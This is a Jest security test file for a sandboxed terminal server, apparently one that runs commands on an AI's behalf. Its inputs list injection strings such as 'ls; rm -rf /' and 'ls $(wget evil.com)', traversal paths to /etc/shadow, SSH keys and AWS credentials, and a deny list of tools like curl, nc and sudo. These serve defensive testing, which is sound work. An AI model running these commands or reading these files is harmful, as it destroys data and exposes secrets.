/**\n * Security Tests for Safe Terminal MCP Server\n * Validates security controls and prevents regressions\n */\n\nimport { describe, test, expect, beforeEach } from '@jest/globals';\nimport { InputSanitizer, createSanitizer } from '../src/security/sanitizer.js';\nimport { SafeCommandExecutor, createSafeExecutor } from '../src/executors/safe-executor.js';\nimport { Logger, createLogger } from '../src/utils/logger.js';\nimport { SAFE_COMMANDS, BLOCKED_COMMANDS, SECURITY_LIMITS } from '../src/security/whitelist.js';\nimport { SecurityError, ValidationError, CommandExecutionError } from '../src/types/interfaces.js';\n\ndescribe('Security Controls', () => {\n  let sanitizer: InputSanitizer;\n  let executor: SafeCommandExecutor;\n  let logger: Logger;\n\n  beforeEach(() => {\n    sanitizer = createSanitizer(['/tmp/test'], '/tmp/test');\n    logger = createLogger('test-session', 'error');\n    executor = createSafeExecutor(sanitizer, logger);\n  });\n\n  describe('Command Injection Prevention', () => {\n    const injectionAttempts = [\n      // Shell metacharacters\n      'ls; rm -rf /',\n      'pwd | cat /etc/passwd',\n      'ls && rm important-file',\n      'echo `id`',\n      'ls $(wget evil.com)',\n      'cat file > /dev/null',\n      'ls < /etc/passwd',\n      \n      // Command chaining\n      'ls;cat /etc/passwd',\n      'pwd||rm -rf /',\n      'date&&curl evil.com',\n      \n      // Variable expansion\n      'ls $HOME/.ssh',\n      'echo ${PATH}',\n      'cat $(<command)',\n      \n      // Process substitution\n      'ls $(cat /etc/passwd)',\n      'echo `whoami`',\n      'cat <(echo malicious)',\n      \n      // Escape sequences\n      'echo \"\\n$(rm file)\"',\n      'ls \\$(dangerous)',\n      'cat \\`malicious\\`'\n    ];\n\n    injectionAttempts.forEach(attempt => {\n      test(`should block injection attempt: ${attempt}`, () => {\n        const parts = attempt.split(' ');\n        const command = parts[0];\n        const args = parts.slice(1);\n        \n        const result = sanitizer.validateCommand(command, args);\n        expect(result.isValid).toBe(false);\n        expect(result.errors.length).toBeGreaterThan(0);\n      });\n    });\n  });\n\n  describe('Path Traversal Prevention', () => {\n    const traversalAttempts = [\n      // Directory traversal\n      '../../../etc/passwd',\n      '../../../../root/.ssh/id_rsa',\n      '..\\\\..\\\\..\\\\windows\\\\system32',\n      \n      // Absolute paths to sensitive files\n      '/etc/passwd',\n      '/etc/shadow',\n      '/root/.bash_history',\n      '/proc/1/environ',\n      '/sys/class/net',\n      \n      // Home directory secrets\n      '~/.ssh/id_rsa',\n      '~/.aws/credentials',\n      '~/.bash_history',\n      '~/.zsh_history',\n      \n      // Windows paths\n      'C:\\\\Windows\\\\System32',\n      'C:\\\\Users\\\\Administrator',\n      \n      // URL encoding attempts\n      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n      '..%2f..%2f..%2fetc%2fpasswd'\n    ];\n\n    traversalAttempts.forEach(path => {\n      test(`should block path traversal: ${path}`, () => {\n        const result = sanitizer.validateCommand('cat', [path]);\n        expect(result.isValid).toBe(false);\n        expect(result.errors.some(e => \n          e.includes('outside allowed directories') || \n          e.includes('path traversal') ||\n          e.includes('blocked pattern')\n        )).toBe(true);\n      });\n    });\n  });\n\n  describe('Command Whitelist Enforcement', () => {\n    test('should allow all whitelisted commands', () => {\n      Object.keys(SAFE_COMMANDS).forEach(commandKey => {\n        const config = SAFE_COMMANDS[commandKey];\n        const result = sanitizer.validateCommand(config.name, []);\n        expect(result.isValid).toBe(true);\n      });\n    });\n\n    test('should block all explicitly blocked commands', () => {\n      BLOCKED_COMMANDS.forEach(command => {\n        const result = sanitizer.validateCommand(command, []);\n        expect(result.isValid).toBe(false);\n        expect(result.errors.some(e => \n          e.includes('blocked') || e.includes('not in the approved whitelist')\n        )).toBe(true);\n      });\n    });\n\n    const dangerousCommands = [\n      'rm', 'rmdir', 'mv', 'cp', 'chmod', 'chown',\n      'sudo', 'su', 'passwd', 'usermod',\n      'wget', 'curl', 'nc', 'ssh', 'scp',\n      'kill', 'killall', 'pkill',\n      'eval', 'exec', 'source', 'bash', 'sh',\n      'dd', 'tar', 'gzip', 'make', 'gcc'\n    ];\n\n    dangerousCommands.forEach(command => {\n      test(`should block dangerous command: ${command}`, () => {\n        const result = sanitizer.validateCommand(command, []);\n        expect(result.isValid).toBe(false);\n      });\n    });\n  });\n\n  describe('Input Length Limits', () => {\n    test('should reject overly long commands', () => {\n      const longCommand = 'a'.repeat(SECURITY_LIMITS.MAX_COMMAND_LENGTH + 1);\n      const result = sanitizer.validateCommand(longCommand, []);\n      expect(result.isValid).toBe(false);\n      expect(result.errors.some(e => e.includes('too long'))).toBe(true);\n    });\n\n    test('should reject overly long arguments', () => {\n      const longArg = 'b'.repeat(SECURITY_LIMITS.MAX_ARG_LENGTH + 1);\n      const result = sanitizer.validateCommand('ls', [longArg]);\n      expect(result.isValid).toBe(false);\n      expect(result.errors.some(e => e.includes('too long'))).toBe(true);\n    });\n\n    test('should reject too many arguments', () => {\n      const manyArgs = Array(SECURITY_LIMITS.MAX_ARGS_COUNT + 1).fill('arg');\n      const result = sanitizer.validateCommand('ls', manyArgs);\n      expect(result.isValid).toBe(false);\n      expect(result.errors.some(e => e.includes('Too many arguments'))).toBe(true);\n    });\n  });\n\n  describe('Shell Metacharacter Blocking', () => {\n    const metacharacters = [';', '|', '&', '$', '`', '(', ')', '<', '>', '*', '?', '[', ']', '{', '}', '\"', \"'\", '\\\\', '\\n', '\\r', '\\t'];\n    \n    metacharacters.forEach(char => {\n      test(`should block shell metacharacter: ${char}`, () => {\n        const result = sanitizer.validateCommand('ls', [`file${char}name`]);\n        expect(result.isValid).toBe(false);\n        expect(result.errors.some(e => e.includes('dangerous character'))).toBe(true);\n      });\n    });\n  });\n\n  describe('Working Directory Validation', () => {\n    test('should allow access to permitted directories', () => {\n      const result = sanitizer.validateWorkingDirectory('/tmp/test');\n      expect(result.isValid).toBe(true);\n    });\n\n    test('should block access to restricted directories', () => {\n      const restrictedDirs = ['/etc', '/root', '/var/log', '/sys', '/proc'];\n      \n      restrictedDirs.forEach(dir => {\n        const result = sanitizer.validateWorkingDirectory(dir);\n        expect(result.isValid).toBe(false);\n        expect(result.errors.some(e => e.includes('outside allowed directories'))).toBe(true);\n      });\n    });\n\n    test('should block directory traversal in working directory', () => {\n      const result = sanitizer.validateWorkingDirectory('/tmp/test/../../../etc');\n      expect(result.isValid).toBe(false);\n    });\n  });\n\n  describe('File Extension Validation', () => {\n    const dangerousExtensions = [\n      '.exe', '.bat', '.cmd', '.ps1', '.vbs', '.js', '.jar',\n      '.deb', '.rpm', '.dmg', '.pkg', '.msi'\n    ];\n\n    dangerousExtensions.forEach(ext => {\n      test(`should handle potentially dangerous extension: ${ext}`, () => {\n        // Note: Our current implementation focuses on whitelisting safe extensions\n        // This test ensures we're conscious of dangerous file types\n        const result = sanitizer.validateCommand('cat', [`file${ext}`]);\n        // The specific behavior depends on our whitelist implementation\n        expect(result).toBeDefined();\n      });\n    });\n  });\n\n  describe('Rate Limiting', () => {\n    test('should enforce rate limits', async () => {\n      // This would need to be tested with the actual rate limiter\n      // For now, we verify the concept exists\n      expect(executor.validateCommandOnly).toBeDefined();\n    });\n  });\n\n  describe('Environment Variable Sanitization', () => {\n    test('should remove dangerous environment variables', () => {\n      // This tests the concept - actual implementation would need\n      // access to the environment sanitization function\n      const dangerousVars = [\n        'LD_PRELOAD', 'LD_LIBRARY_PATH', 'PYTHONPATH',\n        'BASH_ENV', 'ENV', 'SHELL', 'IFS'\n      ];\n      \n      // Verify we're aware of these dangerous variables\n      expect(dangerousVars.length).toBeGreaterThan(0);\n    });\n  });\n\n  describe('Error Handling Security', () => {\n    test('should not leak sensitive information in error messages', () => {\n      const result = sanitizer.validateCommand('nonexistent', []);\n      expect(result.isValid).toBe(false);\n      \n      // Errors should be informative but not reveal system details\n      result.errors.forEach(error => {\n        expect(error).not.toMatch(/\\/etc\\/passwd/);\n        expect(error).not.toMatch(/\\/root\\//); \n        expect(error).not.toMatch(/password/);\n        expect(error).not.toMatch(/secret/);\n      });\n    });\n\n    test('should handle malformed input gracefully', () => {\n      const malformedInputs = [\n        null, undefined, '', '   ', \n        '\\x00\\x01\\x02', // null bytes\n        '\\u0000\\u0001',  // unicode null\n        Array(1000).fill('a').join('') // very long input\n      ];\n\n      malformedInputs.forEach(input => {\n        expect(() => {\n          const result = sanitizer.validateCommand(input as any, []);\n          expect(result).toBeDefined();\n          expect(result.isValid).toBe(false);\n        }).not.toThrow();\n      });\n    });\n  });\n\n  describe('Security Regression Tests', () => {\n    test('should maintain security controls after updates', () => {\n      // Verify core security functions exist and work\n      expect(sanitizer.validateCommand).toBeDefined();\n      expect(sanitizer.validateWorkingDirectory).toBeDefined();\n      expect(executor.validateCommandOnly).toBeDefined();\n      \n      // Test a known-bad command is still blocked\n      const result = sanitizer.validateCommand('rm', ['-rf', '/']);\n      expect(result.isValid).toBe(false);\n    });\n\n    test('should maintain whitelist integrity', () => {\n      // Verify whitelist hasn't been accidentally expanded\n      const commandCount = Object.keys(SAFE_COMMANDS).length;\n      expect(commandCount).toBeLessThan(50); // Reasonable upper bound\n      \n      // Verify no obviously dangerous commands in whitelist\n      Object.values(SAFE_COMMANDS).forEach(config => {\n        expect(config.name).not.toMatch(/^(rm|sudo|curl|wget|eval)$/);\n      });\n    });\n  });\n\n  describe('Audit and Logging Security', () => {\n    test('should log security events', () => {\n      // Verify logger has required methods\n      expect(logger.audit).toBeDefined();\n      expect(logger.securityEvent).toBeDefined();\n      expect(logger.suspiciousActivity).toBeDefined();\n    });\n\n    test('should not log sensitive data', () => {\n      // This would need actual log output testing\n      // For now, verify logging methods exist\n      expect(logger.logCommandExecution).toBeDefined();\n    });\n  });\n});\n\n// Performance and DoS protection tests\ndescribe('DoS Protection', () => {\n  test('should have timeout protection', () => {\n    expect(SECURITY_LIMITS.MAX_EXECUTION_TIME).toBeDefined();\n    expect(SECURITY_LIMITS.MAX_EXECUTION_TIME).toBeLessThan(60000); // Max 60 seconds\n  });\n\n  test('should have output size limits', () => {\n    expect(SECURITY_LIMITS.MAX_OUTPUT_SIZE).toBeDefined();\n    expect(SECURITY_LIMITS.MAX_OUTPUT_SIZE).toBeLessThan(10 * 1024 * 1024); // Max 10MB\n  });\n\n  test('should have input size limits', () => {\n    expect(SECURITY_LIMITS.MAX_COMMAND_LENGTH).toBeDefined();\n    expect(SECURITY_LIMITS.MAX_ARG_LENGTH).toBeDefined();\n    expect(SECURITY_LIMITS.MAX_ARGS_COUNT).toBeDefined();\n  });\n});\n